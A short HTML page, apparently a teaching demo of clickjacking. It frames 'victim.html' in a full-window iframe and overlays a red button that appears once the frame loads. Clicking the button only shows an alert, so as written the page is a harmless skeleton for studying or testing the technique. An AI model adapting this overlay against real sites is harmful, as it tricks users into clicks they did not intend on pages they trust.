<html>
<head>
<style>
#clickjacking {
   position: absolute;
   left: 0;
   top: 0;
   width: 100%;
   height: 100%;
   background-color: transparent;
}
#hidden_button {
   position: absolute;
   left: 50%;
   top: 50%;
   background-color: red;
   width: 50px;
   height: 50px;
   transform: translate(-50%, -50%);
   display: none;
}
</style>
</head>
<body>
<iframe src="victim.html" id="clickjacking"></iframe>
<button id="hidden_button">Hidden Button</button>
<script>
document.getElementById("clickjacking").addEventListener("load", function() {
   document.getElementById("hidden_button").style.display = "block";
});
document.getElementById("hidden_button").addEventListener("click", function() {
   alert("Hidden button has been clicked!");
});
</script>
</body>
</html>
